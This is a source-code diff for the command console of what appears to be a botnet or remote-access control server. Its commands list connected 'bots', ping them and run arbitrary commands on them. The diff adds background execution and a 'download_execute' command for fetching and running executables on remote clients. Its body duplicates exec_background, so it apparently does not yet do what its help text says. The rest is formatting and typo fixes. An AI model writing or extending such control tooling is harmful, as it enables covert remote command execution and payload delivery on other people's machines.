@@ -1,59 +1,60 @@
 package cli
 
 import (
-	"../client"
 	"fmt"
-	"github.com/logrusorgru/aurora"
 	"strings"
 	"time"
+
+	"apollo/server/client"
+	"github.com/logrusorgru/aurora"
 )
 
 // The command type
 type command struct {
-	Name     string                // The Name of the command
-	Aliases  []string              // List of aliases the command can be referred to by
-	MinArgs  int                   // The number of args required for this command. Note that 0 args means just the command
-	Help     string                // The help string for the command which will be printed if there is an error or the help command is used
-	Usage	 string				   // The usage for the command which will be printed out if the command is invalid or the help command is used
+	Name     string                     // The Name of the command
+	Aliases  []string                   // List of aliases the command can be referred to by
+	MinArgs  int                        // The number of args required for this command. Note that 0 args means just the command
+	Help     string                     // The help string for the command which will be printed if there is an error or the help command is used
+	Usage    string                     // The usage for the command which will be printed out if the command is invalid or the help command is used
 	Function func(Cli, []string) string // The function which will be ran. This function takes cli refrence and the args and returns the output
 }
 
 var commandList = []command{
 	{
-		Name:     "test",
-		Aliases:  nil,
-		MinArgs:  0,
-		Help:     "",
-		Usage:    "",
+		Name:    "test",
+		Aliases: nil,
+		MinArgs: 0,
+		Help:    "",
+		Usage:   "",
 		Function: func(c Cli, args []string) string {
 			return fmt.Sprintln(args)
 		},
 	},
 	{
-		Name:     "clear",
-		Aliases:  []string{"cls"},
-		MinArgs:  0,
-		Help:     "Clears the screen",
+		Name:    "clear",
+		Aliases: []string{"cls"},
+		MinArgs: 0,
+		Help:    "Clears the screen",
 		Function: func(c Cli, args []string) string {
 			c.Clear()
 			return ""
 		},
 	},
 	{
-		Name:     "exit",
-		Aliases:  []string{"quit"},
-		MinArgs:  0,
-		Help:     "Exists the cli",
+		Name:    "exit",
+		Aliases: []string{"quit"},
+		MinArgs: 0,
+		Help:    "Exists the cli",
 		Function: func(c Cli, args []string) string {
 			c.remove()
 			return ""
 		},
 	},
 	{
-		Name:     "clients",
-		Aliases:  []string{"list", "bots", "c"},
-		MinArgs:  0,
-		Help:     "Lists the connected clients",
+		Name:    "clients",
+		Aliases: []string{"list", "bots", "c"},
+		MinArgs: 0,
+		Help:    "Lists the connected clients",
 		Function: func(c Cli, args []string) string {
 			if len(client.Clients) == 0 {
 				return "No clients"
@@ -71,13 +72,13 @@ var commandList = []command{
 		},
 	},
 
-	// Clinet commands
+	// Client commands
 	{
-		Name:     "ping",
-		Aliases:  nil,
-		MinArgs:  1,
-		Help:     "Pings a client and returns the response time",
-		Usage:    "ping (clientID)",
+		Name:    "ping",
+		Aliases: nil,
+		MinArgs: 1,
+		Help:    "Pings a client and returns the response time",
+		Usage:   "ping (clientID)",
 		Function: func(c Cli, args []string) string {
 			clients, err := getClientsFromCapture(args[0])
 			if err != nil {
@@ -89,18 +90,18 @@ var commandList = []command{
 				if err != nil {
 					return c.au.Red(fmt.Sprintf("%s not connected", cl.String())).String()
 				}
-				ms := time.Since(start).Nanoseconds()/1e6
+				ms := time.Since(start).Nanoseconds() / 1e6
 				return c.au.Green(fmt.Sprintf("Client %s responded in %dms", cl.String(), ms)).String()
 			}
 			return ""
 		},
 	},
 	{
-		Name:     "exec",
-		Aliases:  []string{"run", "cmd"},
-		MinArgs:  2,
-		Help:     "Runs the specified command on the client and prints the output",
-		Usage:    "exec (client) (command) [args]",
+		Name:    "exec",
+		Aliases: []string{"run", "cmd"},
+		MinArgs: 2,
+		Help:    "Runs the specified command on the client and prints the output",
+		Usage:   "exec (client) (command) [args]",
 		Function: func(c Cli, args []string) string {
 			clients, err := getClientsFromCapture(args[0])
 			if err != nil {
@@ -116,7 +117,49 @@ var commandList = []command{
 			return ""
 		},
 	},
-
+	{
+		Name:    "exec_background",
+		Aliases: []string{"execbackground"},
+		MinArgs: 2,
+		Help:    "Runs the specified command on the client in the background",
+		Usage:   "exec_background (client) (command) [args]",
+		Function: func(c Cli, args []string) string {
+			clients, err := getClientsFromCapture(args[0])
+			if err != nil {
+				return c.au.Red(err).String()
+			}
+			for _, cl := range clients {
+				_, resp, err := cl.RunCommand(args[1], args[2:], true)
+				if err != nil {
+					c.Printf(c.au.Red(fmt.Sprintf("Error running command on %s: %s", cl, err)).String())
+				}
+				c.Printf("%s", resp)
+			}
+			return ""
+		},
+	},
+	{
+		Name:    "download_execute",
+		Aliases: []string{"dle"},
+		MinArgs: 2,
+		Help:    "Downloads and excutes an executable from the specified url",
+		Usage:   "download_execute (client) (url) [args]",
+		Function: func(c Cli, args []string) string {
+			clients, err := getClientsFromCapture(args[0])
+			if err != nil {
+				return c.au.Red(err).String()
+			}
+			for _, cl := range clients {
+				
+				_, resp, err := cl.RunCommand(args[1], args[2:], true)
+				if err != nil {
+					c.Printf(c.au.Red(fmt.Sprintf("Error downloading and executing on %s: %s", cl, err)).String())
+				}
+				c.Printf("%s", resp)
+			}
+			return ""
+		},
+	},
 }
 
 /*
@@ -133,10 +176,10 @@ func (c command) description(au aurora.Aurora) string {
 }
 
 func getHelpString(c Cli, args []string) string {
-	if len(args) >= 1 {		// If we have more than one args, find the command and print its help
+	if len(args) >= 1 { // If we have more than one args, find the command and print its help
 		for _, command := range commandList {
 			if command.Name == strings.ToLower(args[0]) {
-				aliasesString := ""				// Only print aliases if we get help for specific command
+				aliasesString := "" // Only print aliases if we get help for specific command
 				if len(command.Aliases) > 0 {
 					aliasesString = aurora.Gray(11, fmt.Sprintf("\n\t└─Aliases: %v", command.Aliases)).String()
 				}
@@ -153,13 +196,13 @@ func getHelpString(c Cli, args []string) string {
 	return helpString
 }
 
-// This function is here so we can add the help command which refrences itself
+// This function is here so we can add the help command which references itself
 func InitCommands() {
 	commandList = append([]command{{
 		Name:     "help",
 		Aliases:  []string{"h", "?"},
 		MinArgs:  0,
-		Help:	  "Prints out help for all commands or a specified command",
+		Help:     "Prints out help for all commands or a specified command",
 		Usage:    "help [command]",
 		Function: getHelpString,
 	}}, commandList...)
